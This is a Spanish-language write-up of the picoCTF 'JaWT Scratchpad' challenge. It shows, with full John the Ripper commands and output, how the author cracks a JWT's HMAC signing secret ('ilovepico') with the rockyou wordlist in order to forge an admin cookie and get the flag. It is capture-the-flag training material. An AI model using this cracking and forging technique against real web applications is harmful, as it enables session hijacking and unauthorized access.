# USERNAME -> amcdanymx

# JaWT Scratchpad


## Description

Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/58210/` or http://jupiter.challenges.picoctf.org:58210

## Pistas

- What is that cookie?
- Have you heard of JWT?

## Solución

Vamos a la página web, que se nos da en el reto, ingresamos con un nombre, en mi caso ingrese con un nombre "championsligui", lo siguiente que hice fue:

- Descargar la extensión para el navegador llamada "cookie editor"
- Ver las cookies de la página en cuestion y del usuario admin, en ese casi fue la siguiente:

```
jwt
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiY2hhbXBpb25zbGlndWkifQ.6LPACNyaIn1coqc1dztSZtFXk6_l9e49CGeOHJyOMa8



```
- Copiamos el valor de la cookie y lo metemos en un archivo en la consola
- Usamos la pagina web de "jwt.io" para revisar la codificación de la cookie
- Usamos John the Ripper para la decodificación

```
amcdanymx@kali ~

$ sudo apt install john                                           

[sudo] contraseña para amcdanymx:
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias... Hecho
Leyendo la información de estado... Hecho
john ya está en su versión más reciente (1.9.0-Jumbo-1+git20211102-0kali3+b1).
Los paquetes indicados a continuación se instalaron de forma automática y ya no son necesarios.
  libnode108 nodejs nodejs-doc
Utilice «sudo apt autoremove» para eliminarlos.
0 actualizados, 0 nuevos se instalarán, 0 para eliminar y 712 no actualizados.

  
amcdanymx@kali ~

$ john     
John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 [linux-gnu 64-bit x86_64 AVX2 AC]
Copyright (c) 1996-2021 by Solar Designer and others
Homepage: https://www.openwall.com/john/
Usage: john [OPTIONS] [PASSWORD-FILES]
Use --help to list all available options.

  
amcdanymx@kali ~

$ john hash -w=/usr/share/wordlists/rockyou.txt                    
Using default input encoding: UTF-8

Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])

Press 'q' or Ctrl-C to abort, almost any other key for status

ilovepico    (?)  

1g 0:00:00:05 DONE (2022-10-04 18:51) 0.1712g/s 1266Kp/s 1266Kc/s 1266KC/s ilovepinky53..ilovepatri

Use the "--show" option to display all of the cracked passwords reliably

Session completed.

  

amcdanymx@kali ~

$ nano championsliguifile                                          

amcdanymx@kali ~

$ cat championsliguifile                                           
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiY2hhbXBpb25zbGlndWkifQ.6LPACNyaIn1coqc1dztSZtFXk6_l9e49CGeOHJyOMa8

  

amcdanymx@kali ~

$ ls /usr/share/wordlists                                          
amass  dirbuster  fern-wifi  legion  nmap.lst sqlmap.txt  wifite.txt

dirb   fasttrack.txt  john.lst   metasploit  rockyou.txt  wfuzz

amcdanymx@kali ~

$ head /usr/share/wordlists/rockyou.txt                                          [19:00:50]

123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123


amcdanymx@kali ~

$ john championsliguifile -w=/usr/share/wordlists/rockyou.txt      
Using default input encoding: UTF-8

Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])

Press 'q' or Ctrl-C to abort, almost any other key for status

ilovepico    (?)  

1g 0:00:00:03 DONE (2022-10-04 19:01) 0.3105g/s 2296Kp/s 2296Kc/s 2296KC/s ilovepinky53..ilovepatri

Use the "--show" option to display all of the cracked passwords reliably

Session completed.

```

Una vez echo eso se copia la plabra y se pega como la password de la decodificación, se actualiza el sitio y aparce la bandera.